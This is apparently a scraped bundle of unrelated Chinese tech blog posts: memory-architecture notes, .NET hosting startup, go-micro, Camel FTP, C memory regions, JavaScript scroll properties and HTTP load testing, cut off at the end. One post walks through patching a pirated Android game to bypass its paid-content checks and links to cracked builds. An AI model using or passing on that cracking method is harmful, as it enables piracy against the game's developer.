    font-size:10.5pt;
    font-family:等线;}
h2
    {mso-style-link:"Heading 2 Char";
    margin-right:0cm;
    margin-left:0cm;
    font-size:18.0pt;
    font-family:宋体;
    font-weight:bold;}
p.MsoHeader, li.MsoHeader, div.MsoHeader
    {mso-style-link:"Header Char";
    margin:0cm;
    margin-bottom:.0001pt;
    text-align:center;
    layout-grid-mode:char;
    border:none;
    padding:0cm;
    font-size:9.0pt;
    font-family:等线;}
p.MsoFooter, li.MsoFooter, div.MsoFooter
    {mso-style-link:"Footer Char";
    margin:0cm;
    margin-bottom:.0001pt;
    layout-grid-mode:char;
    font-size:9.0pt;
    font-family:等线;}
a:link, span.MsoHyperlink
    {color:blue;
    text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
    {color:#954F72;
    text-decoration:underline;}
p
    {margin-right:0cm;
    margin-left:0cm;
    font-size:12.0pt;
    font-family:宋体;}
p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
    {margin:0cm;
    margin-bottom:.0001pt;
    text-align:justify;
    text-justify:inter-ideograph;
    text-indent:21.0pt;
    font-size:10.5pt;
    font-family:等线;}
span.HeaderChar
    {mso-style-name:"Header Char";
    mso-style-link:Header;}
span.FooterChar
    {mso-style-name:"Footer Char";
    mso-style-link:Footer;}
span.Heading2Char
    {mso-style-name:"Heading 2 Char";
    mso-style-link:"Heading 2";
    font-family:宋体;
    font-weight:bold;}
span.mw-headline
    {mso-style-name:mw-headline;}
span.mw-editsection
    {mso-style-name:mw-editsection;}
span.mw-editsection-bracket
    {mso-style-name:mw-editsection-bracket;}
span.langwithname
    {mso-style-name:langwithname;}
.MsoChpDefault
    {font-family:等线;}
 /* Page Definitions */
 @page WordSection1
    {size:595.3pt 841.9pt;
    margin:72.0pt 90.0pt 72.0pt 90.0pt;
    layout-grid:15.6pt;}
div.WordSection1
    {page:WordSection1;}
 /* List Definitions */
 ol
    {margin-bottom:0cm;}
ul
    {margin-bottom:0cm;}
-->








冯诺依曼存储子系统的改进


       摘要 由于冯诺依曼体系结构存在串行性特点，成为了其发展的瓶颈，针对其串行性人们提出了若干改进和改变措施，涉及到CPU子系统、存储器子系统和IO子系统.本文讨论涉及到存储子系统

    关键词 冯诺依曼 串行 瓶颈 存储子系统 改进

冯·诺伊曼结构(Von Neumann architecture)是一种将程序指令存储器和数据存储器合并在一起的计算机设计概念结构.由于冯诺依曼体系结构存在串行性特点，成为了其发展的瓶颈.当今有许多计算机都采用冯诺依曼体系结构，所以对冯诺依曼体系进行改进的研究有很大的现实意义.

1  
存储子系统存在的问题

1．1存储器读取的串行性：

       冯诺依曼体系结构具有两个明显的特点，一是计算机以存储程序原理为基础，二是程序顺序执行.存储器是现代冯•诺依曼体系的核心，指令与数据混合存储，程序执行时， CPU 在程序计数器的指引下，线性顺序地读取下一条指令和数据.




Fig. 1.Memory of
Computer Model

所有对内存的读取都是独占性的，每一个瞬间，内存实体只能被一个操作对象通过片选信号占据.这就决定了内存的串行读取特性，对内存的操作无法并发进行.

 

1．2内存墙—存储器和CPU数据流量障碍:

    由于CPU速度远大于存储器读写速率[1]，据统计，处理器的性能以每年60%的速度提高，而存储器芯片的带宽每年却只提高10%，工艺水平的发展已使两者之间的带宽间隙越来越大.

 






Fig. 2.
Processor-memory
performance gap: starting in the 1980 performance, the microprocessor and
memory performance over the years

 

 

    处理器从存储器取一次数的同时，将可以执行数百至数千条指令，这就意味着CPU将会在数据输入或输出存储器时闲置.在CPU与存储器之间的流量（数据传输率）与存储器的容量相比起来相当小，在现代计算机中，流量与CPU的工作效率相比之下非常小，在某些情况下（当CPU需要在巨大的数据上运行一些简单指令时），数据流量就成了整体效率非常严重的限制.CPU将会在数据输入或输出存储器时闲置，无法充分发挥计算机的运算能力.因此内存预取是一个关键的瓶颈问题，也被称为“内存墙”（Memory Wall）

 

2存储子系统的改进

2. 1使用并行技术：

    改善的出路是使用并行技术，在指令运算处理及数据存储上都巧妙地运用并行技术.比如说多端口存储器，它具有多组独立的读写控制线路，可以对存储器进行并行的独立操作.又比如：存储器的访问不再用片选控制，而是可以任意地访问单元，在读写数据时用原子操作或事务处理的思想保证数据的一致性，这就取决于所采取的仲裁策略.哈佛体系则从另一个角度改善冯诺依曼存储器串行读写效率低下的瓶颈.哈佛结构是一种将指令储存和数据储存分开的存储器结构.指令储存和数据储存分开，数据和指令的储存可以同时进行，执行时可以预先读取下一条指令.







Fig. 3.
Harvard
architecture

 

2．2分层结构：

       现代高性能计算机系统要求存储器速度快、容量大，并且价格合理.现代计算机常把各种不同存储容量、存取速度、价格的存储器按照一定的体系结构形成多层结构，以解决存取速度、容量和价格之间的矛盾[2].这纾解了内存墙问题.

大多数现代计算机采用三级存储系统：cache+主存+辅存.这种结构主要由以下两个主要的部分组成：

1、 cache存储器系统：cache-主存层次.cache一般由少量快速昂贵的SRAM构成，用来加速大容量但速度慢的DRAM.

2、 虚拟存储器系统：主存-辅存层次









Fig. 4.Memory hierarchy

    多层存储体系结构设计想要达成一个目标，速度快、容量大、又便宜. 根据大量典型程序的运行情况的分析结果表明，在一个较短时间间隔内，程序对存储器访问往往集中在一个很小的地址空间范围内.这种对局部范围内存储器地址访问频繁，对范围以外的存储器地址较少访问的现象称为存储器访问的局部性.所以可以把近期使用的指令和数据尽可能的放在靠近CPU的上层存储器中，这样与CPU交互的数据程序就放在更快的存储器内，暂时不用的数据程序就放在下层存储器.CPU等待时间减少了，整机性能就提上来了.

    把下级存储器调过来的新的页放在本级存储器的什么地方，确定需要的数据、指令是否在本级，本级存储器满了以后先把哪些页给替换掉，在给上层存储器进行写操作的时候如何保证上下层存储器数据一致等映像、查找、替换、更新操作，这些操作需要合理、高效的算法策略才能保证这种多层结构的有效性.

3 智能存储器[3]

       一些研究者预测记忆行为将会优化计算系统的全局性能.他们建议将存储组件与处理核心融合在一个芯片，创造具有处理能力的存储器.这个策略包含intelligent RAM (IRAM)、Merged DRAM/Logic (MDL)
、Process in Memory (PIM) 等等.

    最早的智能存储器是C-RAM，一款由多伦多大学在1992年制造的PIM.这些处理元件通常集成在读出放大器的输出端，由单个控制单元控制，作为SIMD处理器.因为计算元件直接集成到
DRAM输出，这种设计策略可以大量提高DRAM的片上带宽.从结构上讲，这是一种简单的方法，理论上能够实现最高性能. 然而，这也有一些严重的缺点：虽然在结构上简单，但在实际设计和生产中出现了严重的复杂性，因为大多数DRAM核心都是高度优化的，并且很难修改， 这些类型的大规模并行SIMD设计在串行计算中很不成功; 

    传统的cache组织,解决的只是处理器的时间延迟问题,并不能用来解决处理器的存储带宽问题.PIM技术在DRAM芯片上集成了处理器,从而降低了存储延迟,增加了处理器与存储器之间的数据带宽.







Fig. 5.System Architecture
of PIM

基于PIM技术的体系结构的优点在于处理逻辑能以内部存储器带宽(100GB/s甚至更高)直接存取访问片上存储块，从而获取高性能;功耗方面，比与具有相同功能的传统处理器相低一个数量级

 

 

参考文献

[1]Carlos, Carvalho.
The Gap between Processor and Memory Speeds[J]. icca, 2010, (2): 27-34

[2]李广军，阎波等.微处理器系统结构与嵌入式系统设计.北京:电子工业出版社，2009

[3]师小丽.基于PIM技术的数据并行计算研究[D].西安理工大学,2009.

 







.NET Core Agent
.NET Core Agent
熟悉java的朋友肯定知道java agent，当我看到java agent时我很是羡慕，我当时就想.net是否也有类似的功能，于是就搜索各种资料，结果让人很失望。当时根据https://github.com/OpenSkywalking/skywalking-netcore找到这个 https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview，可是不知道怎么用（求指教，听云的APM怎么做的？）。
新的希望
最近看到 https://github.com/OpenSkywalking/skywalking-netcore 更新了，看了一下，找到这个 https://docs.microsoft.com/en-us/aspnet/core/fundamentals/host/platform-specific-configuration
动手测试
首先下载源码 https://github.com/aspnet/Docs/tree/master/aspnetcore/fundamentals/host/platform-specific-configuration/samples/2.x ，这里先介绍下《在 ASP.NET Core 中使用 IHostingStartup 从外部程序集增强应用》的三种方式
从 NuGet 包激活

使用 dotnet pack 命令编译 HostingStartupPackage 包。
将包的程序集名称 HostingStartupPackage 添加到 ASPNETCORE_HOSTINGSTARTUPASSEMBLIES 环境变量中。set ASPNETCORE_HOSTINGSTARTUPASSEMBLIES=HostingStartupPackage
编译并运行应用。 增强型应用中存在包引用（编译时引用）。 应用项目文件中的  指定包项目的输出 (../HostingStartupPackage/bin/Debug) 作为包源。 这允许应用使用该包而无需将包上传到 nuget.org。有关详细信息，请参阅 HostingStartupApp 项目文件中的说明。
set ASPNETCORE_ENVIRONMENT=Development
dotnet HostingStartupApp.dll 访问效果如下：


从类库激活

使用 dotnet build 命令编译 HostingStartupLibrary 类库。
将类库的程序集名称 HostingStartupLibrary 添加到 ASPNETCORE_HOSTINGSTARTUPASSEMBLIES 环境变量中。set ASPNETCORE_HOSTINGSTARTUPASSEMBLIES=HostingStartupLibrary
bin - 通过将类库编译输出中的 HostingStartupLibrary.dll 文件复制到应用的 bin/Debug 文件夹，将类库程序集部署到应用。
set ASPNETCORE_ENVIRONMENT=Development
dotnet HostingStartupApp.dll 访问效果如下：


从运行时存储部署的程序集激活(重点，可以实现Automatic-Agent)

StartupDiagnostics 项目使用 PowerShell 修改其 StartupDiagnostics.deps.json 文件。 默认情况下，Windows 7 SP1 和 Windows Server 2008 R2 SP1 及以后版本的 Windows 上安装有 PowerShell。 若要在其他平台上获取 PowerShell，请参阅安装 Windows PowerShell。
构建 StartupDiagnostics 项目。 构建项目后，会自动生成项目文件中的构建目标：


触发 PowerShell 脚本以修改 StartupDiagnostics.deps.json 文件。
将 StartupDiagnostics.deps.json 文件移动到用户配置文件的 additionalDeps 文件夹。


在承载启动目录的命令提示符处执行 dotnet store 命令，将程序集及其依赖项存储在用户配置文件的运行时存储中：
dotnet store --manifest StartupDiagnostics.csproj --runtime 
对于 Windows，该命令使用 win7-x64 运行时标识符 (RID)。 为其他运行时提供承载启动时，请替换为正确的 RID。
设置环境变量：


set ASPNETCORE_HOSTINGSTARTUPASSEMBLIES=StartupDiagnostics
set DOTNET_ADDITIONAL_DEPS=%UserProfile%.dotnet\x64\additionalDeps\StartupDiagnostics



运行示例应用
请求 /services 终结点以查看应用的注册服务。 请求 /diag 终结点以查看诊断信息。
/services

/diag


总结
用第三种方式就可以实现Automatic-Agent，在此感谢skywalking-netcore的付出.
这里可能没有将清楚agent的概念，还请大家自行补脑。
如有补充或错误请指出，谢谢！

********************************************************************************************************************************************************************************************************
go微服务框架go-micro深度学习(三) Registry服务的注册和发现
     服务的注册与发现是微服务必不可少的功能，这样系统才能有更高的性能，更高的可用性。go-micro框架的服务发现有自己能用的接口Registry。只要实现这个接口就可以定制自己的服务注册和发现。
    go-micro在客户端做的负载，典型的Balancing-aware Client模式。
     
     服务端把服务的地址信息保存到Registry, 然后定时的心跳检查，或者定时的重新注册服务。客户端监听Registry，最好是把服务信息保存到本地，监听服务的变动，更新缓存。当调用服务端的接口是时，根据客户端的服务列表和负载算法选择服务端进行通信。
     go-micro的能用Registry接口

type Registry interface {
    Register(*Service, ...RegisterOption) error
    Deregister(*Service) error
    GetService(string) ([]*Service, error)
    ListServices() ([]*Service, error)
    Watch(...WatchOption) (Watcher, error)
    String() string
    Options() Options
}

type Watcher interface {
    // Next is a blocking call
    Next() (*Result, error)
    Stop()
}

　　这个接口还是很简单明了的，看方法也大概能猜到主要的作用
　　Register方法和Deregister是服务端用于注册服务的，Watcher接口是客户端用于监听服务信息变化的。
      接下来我以go-micro的etcdv3为Registry的例给大家详细讲解一下go-micro的详细服务发现过程
go-micro 服务端注册服务
     流程图

     
     服务端看上去流程还是比较简单的，当服务端调用Run()方法时，会调用service.Start()方法。这个除了监听端口，启动服务，还会把服务的ip端口号信息，和所有的公开接口的元数据信息保存到我们选择的Register服务器上去。
     看上去没有问题，但是，如果我们的节点发生故障，也是需要告诉Register把我们的节点信息删除掉。
     Run()方法中有个go s.run(ex) 方法的调用，这个方法就是根据我们设置interval去重新注册服务，当然比较保险的方式是我们把服务的ttl也设置上，这样当服务在未知的情况下崩溃，到了ttl的时间Register服务也会自动把信息删除掉。
 
    设置服务的ttl和 interval

    // 初始化服务
    service := micro.NewService(
        micro.Name(common.ServiceName),
        micro.RegisterTTL(time.Second*30),
        micro.RegisterInterval(time.Second*20),
        micro.Registry(reg),
    )

  ttl就是注册服务的过期时间，interval就是间隔多久再次注册服务。如果系统崩溃，过期时间也会把服务删除掉。客户端当然也会有想就的判断，下面会详细解说 
客户端发现服务
    客户端的服务发现要步骤多一些，但并不复杂，他涉及到服务选择Selector和服务发现Register两部分。
    Selector是基于服务发现的，根据你选择的主机选择算法，返回主机的信息。默认的情况，go-micro是每次要得到服务器主机的信息都要去Register去获取。但是查看cmd.go的源码你会发现默认初始化的值，selector的默认flag是cache。DefaultSelectors里的cache对应的就是初始化cacheSelector方法

 
    但是当你在执行service.Init()方法时

go-micro会把默认的selector替换成cacheSelector,具体的实现是在cmd.go的Before方法里

cacheSelector 会把从Register里获取的主机信息缓存起来。并设置超时时间，如果超时则重新获取。在获取主机信息的时候他会单独跑一个协程，去watch服务的注册，如果有新节点发现，则加到缓存中，如果有节点故障则删除缓存中的节点信息。当client还要根据selector选择的主机选择算法才能得到主机信息，目前只有两种算法，循环和随机法。为了增加执行效率，很client端也会设置缓存连接池，这个点，以后会详细说。
 所以大概的客户端服务发现流程是下面这样

     主要的调用过程都在Call方法内

 
主要的思路是
    从Selector里得到选择主机策略方法next。
    根据Retory是否重试调用服务，调用服务的过程是，从next 方法内得到主机，连接并传输数据 ，如果失败则重试，重试时，会根据主机选择策略方法next重新得到一个新的主机进行操作。
   
     
 
********************************************************************************************************************************************************************************************************
Spring boot项目集成Camel FTP
目录

1、Spring 中集成camel-ftp
1.1、POM引用
1.2、SpringBoot application.yml配置
1.3、配置路由
1.4、配置文件过滤
1.5、文件处理器

2、参考资料


1、Spring 中集成camel-ftp
  近期项目中涉及到定期获取读取并解析ftp服务器上的文件，自己实现ftp-client的有些复杂，因此考虑集成camel-ftp的方式来解决ftp文件的下载问题。自己则专注于文件的解析工作.
demo: https://github.com/LuckyDL/ftp-camel-demo
1.1、POM引用
<dependency>
    <groupId>org.apache.camel</groupId>
    <artifactId>camel-spring-boot-starter</artifactId>
    <version>2.22.1</version>
</dependency>
<dependency>
    <groupId>org.apache.camel</groupId>
    <artifactId>camel-ftp</artifactId>
    <version>2.22.1</version>
</dependency>


注意：
在选择版本的时候，如果SpringBoot版本是1.5.10.RELEASE的话，那么camel的版本最高只能使用2.21.2，使用2.22版本将会报错。经测试的配套关系如下：




SrpingBoot
Camel




1.5
<=2.21.2


2.0
>=2.22.x



其他情况都会出现错误.

1.2、SpringBoot application.yml配置
ftp:
  addr: 172.18.18.19:21    # ftp地址、端口
  name: ftpuser
  password: ftp2018
  options: password=${ftp.password}&readLock=rename&delay=10s&binary=true&filter=#zipFileFilter&noop=true&recursive=true
  url: ftp://${ftp.name}@${ftp.addr}/?${ftp.options}
  # 本地下载目录
  local-dir: /var/data

# 后台运行进程
camel:
  springboot:
    main-run-controller: true

management:
  endpoint:
    camelroutes:
      enabled: true
      read-only: true

配置说明：

delay：每次读取时间间隔
filter: 指定文件过滤器
noop：读取后对源文件不做任何处理
recursive：递归扫描子目录，需要在过滤器中允许扫描子目录
readLock：对正在写入的文件的处理机制

更多参数配置见官方手册

1.3、配置路由
  要配置从远端服务器下载文件到本地，格式如下，from内部为我们在上面配置的url，to为本地文件路径。
@Component
public class DownloadRoute extends RouteBuilder {
    /** logger */
    private static final Logger logger = LoggerFactory.getLogger(DownloadRoute.class);

    @Value("${ftp.server.info}")
    private String sftpServer;
    
    @Value("${ftp.local.dir}")
    private String downloadLocation;
    
    @Autowired
    private DataProcessor dataProcessor;

    @Override
    public void configure() throws Exception{
        from(sftpServer)
                .to(downloadLocation)
                .process(dataProcessor)
                .log(LoggingLevel.INFO, logger, "Download file ${file:name} complete.");
    }
}

说明：
 若将from配置为本地地址，to配置为远端地址，则可以实现向远端服务器上传文件
 process是数据处理器，如果仅仅是下载文件到本地，那么就不需要该配置。

也可以配置多条路由也处理不同的业务：
@Override
    public void configure() throws Exception{
        // route1
        from(sftpServer)
                .to(downloadLocation)
                .process(dataProcessor)
                .log(LoggingLevel.INFO, logger, "Download file ${file:name} complete.");
        // route2
        from(xxx).to(xxxx);
        
        // route3
        from(xxxx).to(xxx).process(xxx);
    }
1.4、配置文件过滤
  如果ftp服务器上有很多文件，但是我们需要的只是其中的一种，全部下载下来，有业务层来实现过滤肯定不合适，我们可以使用camel-ftp的文件过滤器，通过url中的filter来指定，如“filter=#zipFileFilter”,
用户需要实现GenericFileFilter接口的accept方法。
  例如我们只需要下载后缀名为.zip的压缩包到本地，过滤器的编写方法如下，因为我要递归扫描子目录，因此类型为目录的文件也需要允许通过。
/**
 * camel ftp zip文件过滤器
 */
@Component
public class ZipFileFilter implements GenericFileFilter {
    
    @Override
    public boolean accept(GenericFile file) {
        return file.getFileName().endsWith(".zip") || file.isDirectory();
    }
}
1.5、文件处理器
  文件处理器就是我们对下载到本地的文件进行处理的操作，比如我们可能需要对下载的文件重新规划目录；或者解析文件并进行入库操作等。这就需要通过实现Processer的process方法。
  本文中的demo就是通过processor来解析zip包中的文件内容：
@Component
public class DataProcessor implements Processor {

    /** logger */
    private static final Logger logger = LoggerFactory.getLogger(DataProcessor.class);


    @Value("${ftp.local-dir}")
    private String fileDir;

    @Override
    public void process(Exchange exchange) throws Exception {
        GenericFileMessage<RandomAccessFile> inFileMessage = (GenericFileMessage<RandomAccessFile>) exchange.getIn();
        String fileName = inFileMessage.getGenericFile().getFileName();
        String file_path = fileDir + '/' + fileName;
        readZip(file_path);
    }
    
    ...   // 省略数据处理方法
}
2、参考资料
  关于camel ftp的各个参数配置，参见官方手册：http://camel.apache.org/ftp2.html
  此处需要注意的是，camel ftp手册里面只写了ftp独有的一些配置项，camel-ftp组件继承自camel-file，手册里面有说明，就一句话，不注意就可能忽略了，笔者就是没注意，被递归扫描子目录的问题折腾了2天（阅读要细心o(╥﹏╥)o）。。。因此有一些参数配置项可能在camel-ftp手册里面找不到，请移步至：http://camel.apache.org/file2.html
********************************************************************************************************************************************************************************************************
Android破解学习之路（十）—— 我们恋爱吧 三色绘恋 二次破解
前言
好久没有写破解教程了（我不会告诉你我太懒了），找到一款恋爱游戏，像我这样的宅男只能玩玩恋爱游戏感觉一下恋爱的心动了。。
这款游戏免费试玩，但是后续章节得花6元钱购买，我怎么会有钱呢，而且身在吾爱的大家庭里，不破解一波怎么对得起我破解渣渣的身份呢！
哟，还是支付宝购买的，直接9000大法，但是破解的时候没有成功，可能是支付的关键代码在so文件中把，自己还不是很熟悉IDA破解so，所以就撤了，网上找到了别人的破解版本，直接就是解锁版本的。
但是，这破解版的有点奇葩，第一次打开可以正常进入，第二次打开就卡在了它的logo上（破解者加了一个界面显示logo，就是类似XX侠），把它软件下载之后，再次点击就可以正常进入游戏了，支付宝内购破解我破不了，二次破解我总行吧，我的目的就是不用安装APP也能进入游戏
破解思路

既然第一次可以正常进入，第二次就无法进入，肯定是第二次进入的时候做了个验证
破解者加的那个logo界面，应该是有跳转到正常游戏界面的代码，我们直接在logo界面执行跳转代码，跳转到游戏界面
打开游戏的时候直接跳过logo界面，进入游戏主界面

破解开始
思路1
首先，直接丢进Androidkiller中反编译，这款游戏没有加壳，好说，我们由工程信息的入口进到入口界面，展开方法，可以看到许多方法，由于我们猜想是第二次进入的时候做了验证，那么我们就查找一下方法最末尾为Z（代表着此方法返回的是一个Boolean值），可以看到图中红色方框，末尾为Z，名字也是确定了我们的思路没有错，判断是否第一次进入

破解很简单，我们只需要让此方法直接返回一个true的值即可解决

测试是通过的，这里就不放图了
思路2
第一种的方法尽管成功了，但是觉得不太完美，我们看一下能不能直接跳转到游戏的主界面，搜索intent（android中跳转界面都是需要这个intent来完成），没有找到结果，找到的几个都不是跳转到主界面的代码（这游戏的主界面就是MainActivity）
思路2失败
思路3
思路2失败了，我们还有思路3，首先介绍一下，android的APP，主界面是在AndroidManifest.xml这个文件中定义的
我们直接搜索入口类VqsSdkActivity,搜索中的第一个正是我们需要的

点进入就可以看到，定义游戏的启动界面的关键代码，红色框中

我们把这行代码剪切到MainActivity那边去（我们直接搜索MainActivity就可以定位到AndroidManifest中的具体位置）

嗯，测试通过
再加些东西吧，加个弹窗，名字也改一下吧，大功告成！！
测试截图



下载链接
原版破解版： 链接: https://pan.baidu.com/s/1uvjRCkf2hPdI8vI467Vh5g 提取码: p718
二次破解版本： 链接: https://pan.baidu.com/s/128RH5ij3LRjsZPoG3vTTgQ 提取码: vbmv

********************************************************************************************************************************************************************************************************
C语言程序猿必会的内存四区及经典面试题解析
前言：
　　　 为啥叫C语言程序猿必会呢？因为特别重要，学习C语言不知道内存分区，对很多问题你很难解释，如经典的：传值传地址，前者不能改变实参，后者可以，知道为什么？还有经典面试题如下：　

#include <stdio.h>
#include <stdlib.h>#include <stdlib.h>
void getmemory(char *p)
{
p=(char *) malloc(100);
}
int main( )
{
char *str=NULL;
getmemory(str);
strcpy(str,"hello world");
printf("%s/n",str);
free(str);
return 0;
}

　　这段代码执行了会怎么样？接下里我会解释这道面试题。
　　一、内存布局
　　可能网上有很多把内存分的很多、很细，但觉得很难记，并对于理解问题作用并不大。现在主要将内存分为四区如下：
　　代码区：存放代码；运行期间不可修改
　　全局区：全局变量、静态变量、常量字符串；程序运行时存在，退出时消失。
　　栈区：自动变量、函数参数、函数返回值；作用域函数内（代码块内）
　　堆区：动态分配内存，需手动释放
　　用交换两个数的程序进行解释吧，如下：　

#include<stdio.h>

void swap(int a,int b)
{
    int temp = a;    //栈
    a = b;
    b =temp;
}
int main()
{
    int a=1,b=2;    //栈
    printf("a:%d,b:%d\n",a,b);
    swap(a,b);
    printf("a:%d,b:%d\n",a,b);

    return 0;
}

　　画个图进行讲解，如下：　　PS：依旧是全博客园最丑图，不接受反驳！
　　
　　说明：main函数把a,b的值给了temp函数，temp函数在内部交换了值，并没有影响main函数，并且temp结束，栈上的数据释放。传值不会改变实参。
　　二、程序示例及面试题讲解
　　1、传地址交换两个数　　 
 　　在拿传指针的例子来说明一下，如下：

#include<stdio.h>

void swap(int *a,int *b)
{
    int temp = *a;    //栈
    *a = *b;
    *b =temp;
}
int main()
{
    int a=1,b=2;    //栈
    printf("a:%d,b:%d\n",a,b);
    swap(&a,&b);
    printf("a:%d,b:%d\n",a,b);

    return 0;
}

　　结果：成功交换了实参的值
　　用图进行解释，如下：　　PS：依旧是全博客园最丑图，不接受反驳！
　　
　　说明：实参把地址传给形参，形参*a、*b是取的实参在内存中的值，交换也就是交换实参的值了，所以成功交换了实参的值。
　　2、解释面试题
　　程序就是最开始的面试题那个，不再列出来了。
　　结果：段错误
　　然后画图进行说明，如下：　　PS：依旧是全博客园最丑图，不接受反驳！
　　
　　说明：最重要一点实参是把值传给形参，而不是地址，要理解这一点！就是把实参的NULL给了形参，然后getmemory在堆上开辟空间，结束时p被释放了，但main函数中的str并没有指向堆上的内存，再给strcpy,当然会段错误。
　　三、解决被调函数开辟空间
　　可能有人就问了，我就想让被调函数开空间，怎么办呢？那就需要形参是二级指针了。
　　给大家演示一下，代码如下：

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void getmemory(char **p)
{
*p=(char *) malloc(100);
}
int main( )
{
char *str=NULL;
getmemory(&str);
strcpy(str,"hello world");
printf("%s/n",str);
free(str);
return 0;
}

　　结果：没有段错误了
　　大家可以自己画下图，不懂欢迎随时留言。
　　三、十月份计划
　　十月份需求会很忙，但也要抽出时间把C++基础学完，然后深入学习数据结构和算法了
　　
 
********************************************************************************************************************************************************************************************************
JavaScript之scrollTop、scrollHeight、offsetTop、offsetHeight、clientHeight、clientTop学习笔记
全文参考：https://github.com/iuap-design/blog/issues/38 、MDN
clientHeight，只读
 clientHeight  可以用公式  CSS height + CSS padding - 水平滚动条的高度 (如果存在)  来计算。

如图，这样一个div，它的clientHeight为95，计算：50(height)+30(padding-top)+30(padding-bottom)-15(经测量滚动条高度就是15)=95

 

clientTop，只读
一个元素顶部边框的宽度（以像素表示）。嗯。。就只是  border-top-width 
类似的属性还有一个 clientLeft ，顾名思义……
 
offsetHeight，只读
元素的offsetHeight是一种元素CSS高度的衡量标准，包括元素的边框、内边距和元素的水平滚动条（如果存在且渲染的话），是一个整数。
还是上面的图，div的offsetHeight为112。计算：50+60(上下内边距)+2(上下边框)=112
 
offsetTop，只读

HTMLElement.offsetParent 是一个只读属性，返回一个指向最近的包含该元素的定位元素。如果没有定位的元素，则 offsetParent 为最近的 table, table cell 或根元素（标准模式下为 html；quirks 模式下为 body）。当元素的 style.display 设置为 "none" 时，offsetParent 返回 null。




















它返回当前元素相对于其 offsetParent 元素的顶部的距离。
还是上面那张图，div的offsetTop为20，因为margin-top是20，距离html顶部的距离是20...
 
scrollHeight，只读
实话，这么久了，竟然一直搞错这个scroll相关属性，其实它描述的是outer的属性，而窝一直取inner的属性值，难怪scrollTop一直是0。。。

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
        #outer {
            margin: 100px 50px;
            background: url(http://images.cnblogs.com/cnblogs_com/wenruo/873448/o_esdese.jpg);
            height: 100px;
            width: 50px;
            padding: 10px 50px;
            overflow: scroll;
        } 
        #inner {
            height: 200px;
            width: 50px;
            background-color: #d0ffe3;
        }
    </style>
</head>
<body>
    <div id="outer">
        <div id="inner"></div>
    </div>
</body>
</html>

 
因为限制了父元素的高度，所以不能全部显示子元素，设置了overflow之后，可以通过滚动条的形式滑动查看子元素。效果如图1，如果没有限制父元素的高度，那么效果将如图2显示。
（图1）                        （图2）
scrollHeight就是图2的高度，没有高度限制时，能够完全显示子元素时的高度（clientHeight）。
所以这里scrollHeight为220，计算：200+10+10=220
 
scrollTop，可写
是这些元素中唯一一个可写可读的。
下面的图是用微信截图随便画的:D（不小心混入了一个光标。。
 
所以当滚动条在最顶端的时候， scrollTop=0 ，当滚动条在最低端的时候， scrollTop=115 
这个115怎么来的（滚动条高度是15，我量的），见下图。（实为我主观臆测，不保证准确性。。。_(:з」∠)_

scrollTop是一个整数。
如果一个元素不能被滚动，它的scrollTop将被设置为0。
设置scrollTop的值小于0，scrollTop 被设为0。
如果设置了超出这个容器可滚动的值, scrollTop 会被设为最大值。
 
判定元素是否滚动到底：

element.scrollHeight - element.scrollTop === element.clientHeight

返回顶部

element.scrollTop = 0

 
一个简单的返回顶部的时间，一个需要注意的地方是，动画是由快到慢的。

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>返回顶部</title>
    <style>
        #outer { height: 100px; width: 100px; padding: 10px 50px; border: 1px solid; overflow: auto; }
    </style>
</head>
<body>
    <div id="outer">
        <div id="inner"></div>
    </div>
    <button onclick="toTop(outer)">返回顶部</button>
    <script>
        function toTop(ele) {
            // ele.scrollTop = 0;
            let dy = ele.scrollTop / 4; // 每次更新scrollTop改变的大小
            if (ele.scrollTop > 0) {
                ele.scrollTop -= Math.max(dy, 10);
                setTimeout(() => {
                    toTop(ele, dy);
                }, 30);
            }
        }
        // 初始化
        window.onload = () => {
            for (let i = 0; i < 233; i++) inner.innerText += `第${i}行\n`;
        }
    </script>
</body>
</html>

 
********************************************************************************************************************************************************************************************************
http性能测试点滴
WeTest 导读
在服务上线之前，性能测试必不可少。本文主要介绍性能测试的流程，需要关注的指标，性能测试工具apache bench的使用，以及常见的坑。
 

 


什么是性能测试


 
性能测试是通过自动化的测试工具模拟多种正常、峰值以及异常负载条件来对系统的各项性能指标进行测试。负载测试和压力测试都属于性能测试，两者可以结合进行。通过负载测试，确定在各种工作负载下系统的性能，目标是测试当负载逐渐增加时，系统各项性能指标的变化情况。压力测试是通过确定一个系统的瓶颈或者不能接受的性能点，来获得系统能提供的最大服务级别的测试。
 


性能测试的目标是什么


性能测试最终的目的，是找到系统的瓶颈，一般来说，是找到服务单机最大TPS(每秒完成的事务数)。
需要注意的是，服务的TPS需要结合请求平均耗时来综合考虑。例如：服务TPS压到1000，平均请求耗时500ms，但是假如我们定的服务请求耗时不能超过200ms，那么这个1000的TPS是无效的。
很多场景下，服务都会设置超时时间，若平均耗时超过此超时时间，则可认为服务处于不可用状态。


什么时候需要性能测试


1.功能测试完成之后，上线之前。
正常情况下，上线之前，都应该进行性能测试，尤其是请求量较大的接口，重点业务的核心接口，以及直接影响用户操作流程的接口。
2.各种大促，运营活动开始之前。
大促，运营活动，都会导致流量激增，因此上线之前做好压力测试，评估系统性能是否满足预估流量，提前做好准备。
举个反面例子：聚美优品，年年大促年年挂。
再来个正面的例子：每年双十一之前，阿里都会有全链路压测，各个业务自己也会有独立的压测，阿里在这块做得还是非常不错的。


怎么做性能测试


常见的http性能测试工具
1. httpload

2. wrk

3. apache bench



 
 
最终我们选择apache bench
 
看上去wrk才是最完美的，但是我们却选择了ab。我们验证过各种工具请求数据是否准确，压测的时候，通过后台日志记录，最终得出结论，ab的请求数误差在千分之二左右，而其他两个工具在千分之五左右。
不过不得不说，wrk的确是一款非常优秀的压测工具，采用异步IO模型，能压到非常高的TPS。曾经用空逻辑接口压到过7w的TPS，而相同接口，ab只能压到2w多。


apache bench的使用


前面已经给了一个简单的例子了，下面详细介绍下ab的使用。
如何安装？如果docker容器已经安装的apache，那么恭喜，ab是apache自带的一个组件，不用重新安装了。当然，也可以自己单独安装apache bench。

ab 常用参数介绍
